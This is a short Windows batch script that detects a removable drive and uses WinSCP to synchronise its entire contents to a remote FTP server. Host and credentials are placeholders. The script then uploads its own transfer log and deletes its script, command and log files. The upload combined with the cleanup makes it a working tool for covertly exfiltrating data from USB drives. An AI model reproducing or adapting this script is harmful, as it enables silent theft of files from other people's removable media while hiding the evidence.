for /f "tokens=2 delims==" %%a in ('wmic LogicalDisk where "DriveType='2'" get DeviceID /value') do (
set DriveU=%%a
    )
echo open ftp://youraccount:password@ftpipaddress -passive=off >>youraccount.txt
echo synchronize remote %DriveU% / >>youraccount.txt
echo exit >>youraccount.txt
set qf=%RANDOM%
winscp /script=youraccount.txt /ini=WinSCP.ini /log=%qf%%date:~8,2%.txt
echo open ftpipaddress 21 >> log.txt
echo user youraccount password>> log.txt
echo bin >> log.txt
echo put "%qf%%date:~8,2%.txt" "log/%qf%%date:~8,2%.txt" >> log.txt
echo bye >> log.txt
ftp -n -s:"log.txt"
del /q youraccount.txt
del /q log.txt
del /q %qf%%date:~8,2%.txt


